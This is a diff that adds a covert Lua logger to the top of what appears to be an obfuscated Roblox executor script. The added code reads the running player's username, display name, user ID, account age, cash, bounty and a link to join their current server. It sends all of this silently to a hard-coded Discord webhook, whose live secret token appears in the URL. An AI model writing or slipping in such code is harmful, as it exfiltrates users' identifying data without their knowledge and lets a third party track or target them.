@@ -1,3 +1,69 @@
+
+
+local pp = game.Players.LocalPlayer
+
+
+local url =
+   "https://discord.com/api/webhooks/905720579536064512/Gpo386dGLaWAo3tGqMqL3wNKiQ1DQesMZxhrutPVEnFGAA6RfJaxscjjXltrXT4OtcvK"
+local data = 
+	{
+		["content"] = "",
+		["embeds"] = {{
+			["title"] = "__**Join Game**__",
+			["description"] = "https://www.roblox.com/home?placeID=2788229376&gameID="..game.JobId,
+			["type"] = "rich",
+			["color"] = tonumber(0xffffff),
+			["fields"] = {
+				{
+					["name"] = "__GameId__",
+					["value"] = "**GameID:** "..game.PlaceId,
+					["inline"] = true
+				},
+				{
+					["name"] = "__Name__",
+					["value"] = "**User:** ".. pp.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "__Displayname__",
+					["value"] = "**User:** ".. pp.DisplayName,
+					["inline"] = true
+				},
+				{
+					["name"] = "__Cash__",
+					["value"] = "**Cash:** "..pp:WaitForChild("DataFolder"):WaitForChild("Currency").Value,
+					["inline"] = true
+				},
+				{
+					["name"] = "__Bounty__",
+					["value"] = "**Bounty:** "..pp:WaitForChild("leaderstats"):WaitForChild("Wanted").Value,
+					["inline"] = true
+				},
+				{
+					["name"] = "__Account Age__",
+					["value"] = "**Age:** "..pp.AccountAge.." **Days**",
+					["inline"] = true
+				},
+				{
+					["name"] = "__User ID__",
+					["value"] = "**Bounty:** "..pp.UserId,
+					["inline"] = true
+				}
+			}
+		}}
+	}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+
 _oG2AC7XFcErktLCW, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
